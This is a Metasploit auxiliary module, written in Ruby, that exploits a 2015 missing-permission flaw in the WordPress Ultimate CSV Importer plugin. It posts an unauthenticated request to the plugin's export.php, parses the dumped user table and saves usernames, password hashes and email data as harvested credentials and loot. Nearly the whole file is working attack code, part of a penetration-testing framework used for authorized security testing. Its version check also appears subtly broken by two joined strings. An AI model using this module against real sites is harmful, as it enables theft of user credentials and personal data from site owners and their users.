##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'csv'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Ultimate CSV Importer User Table Extract',
      'Description'     => %q{
        Due to lack of verification of a visitor's permissions, it is possible
        to execute the 'export.php' script included in the default installation of the
        Ultimate CSV Importer plugin and retrieve the full contents of the user table
        in the WordPress installation. This results in full disclosure of usernames,
        hashed passwords and email addresses for all users.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'James Hooker', # Disclosure
          'rastating'     # Metasploit module
        ],
      'References'      =>
        [
          ['WPVDB', '7778']
        ],
      'DisclosureDate'  => 'Feb 02 2015'
    ))
  end

  def plugin_url
    normalize_uri(wordpress_url_plugins, 'wp-ultimate-csv-importer')
  end

  def exporter_url
    normalize_uri(plugin_url, 'modules', 'export', 'templates', 'export.php')
  end

  def check
    check_plugin_version_from_readme('wp-ultimate-csv-importer', '3.6.7' '3.6.0')
  end

  def process_row(row)
    if row[:user_login] && row[:user_pass]
      print_good("Found credential: #{row[:user_login]}:#{row[:user_pass]}")

      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        private_type: :nonreplayable_hash,
        address: ::Rex::Socket.getaddress(rhost, true),
        port: rport,
        protocol: 'tcp',
        service_name: ssl ? 'https' : 'http',
        username: row[:user_login],
        private_data: row[:user_pass],
        workspace_id: myworkspace_id
      }

      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }
      login_data.merge!(credential_data)
      create_credential_login(login_data)
    end
  end

  def parse_csv(body, delimiter)
    begin
      CSV::Converters[:blank_to_nil] = lambda do |field|
        field && field.empty? ? nil : field
      end
      csv = CSV.new(body, :col_sep => delimiter, :headers => true, :header_converters => :symbol, :converters => [:all, :blank_to_nil])
      csv.to_a.map { |row| process_row(row) }
      return true
    rescue
      return false
    end
  end

  def run
    print_status("Requesting CSV extract...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => exporter_url,
      'vars_post' => { 'export' => 'users' }
    )
    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200

    print_status("Parsing response...")
    unless parse_csv(res.body, ',')
      unless parse_csv(res.body, ';')
        fail_with(Failure::UnexpectedReply, "#{peer} - Failed to parse response, the CSV was invalid")
      end
    end

    store_path = store_loot('wordpress.users.export', 'csv', datastore['RHOST'], res.body, 'users_export.csv', 'WordPress User Table Extract')
    print_good("CSV saved to #{store_path}")
  end
end
